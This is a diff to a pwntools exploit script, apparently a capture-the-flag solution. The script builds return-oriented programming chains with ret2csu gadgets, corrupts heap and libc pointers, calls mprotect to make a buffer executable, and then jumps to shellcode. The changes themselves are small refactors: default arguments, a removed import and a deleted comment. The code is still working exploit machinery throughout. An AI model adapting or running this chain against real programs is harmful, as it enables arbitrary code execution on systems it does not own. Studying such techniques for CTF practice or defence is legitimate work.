@@ -1,5 +1,4 @@
 from pwn import *
-import time
 
 #init
 
@@ -32,7 +31,7 @@ def regcsu(rbx, rbp, r12, r13, r14, r15): #7 qwords
     rop.raw(r14)
     rop.raw(r15)
 
-def ret2csu(call, edi, rsi, rdx): #15 qwords
+def ret2csu(call, edi = 0, rsi = 0, rdx = 0): #15 qwords
     regcsu(0x0, 0x1, edi, rsi, rdx, call)
     rop.call(csu + 56)
     for i in range(0x7):
@@ -84,7 +83,7 @@ ret2dtor(0x3f8, -0x1f000) #uses heap adr 1, chg top chnk size
 rop.malloc(0x1008) #3 qwords
 ret2dtor(0x3f8 - 0x20 + 0x8, mprotect_off - arena_off) #uses heap adr 2, chg libc ptr to point to protect
 ret2csu(0x3f8 - 2 * 0x20 + 0x8, arr ^ (arr & 0xfff), 0x1000, 0x7) #uses heap adr 3, calls mprotect
-ret2csu(arr + len(rop.chain()) + 15 * 0x8, 0x0, 0x0, 0x0) #call shellcode
+ret2csu(arr + len(rop.chain()) + 15 * 0x8) #call shellcode
 rop.raw(arr + len(rop.chain()) + 0x8) #shellcode ptr
 
 #log.info('Rop 2:\n' + rop.dump())
@@ -102,7 +101,6 @@ rop = ROP(e)
 for i in range(0, len(s) - 0x4, 4):
     ret2dtor(arr + i, u32(s[i:i + 0x4])) #write 2nd rop
 
-#rop.call(e.plt['_exit'], [1])
 rop.migrate(arr) #call 2nd rop
 
 #log.info('Rop 1:\n' + rop.dump())
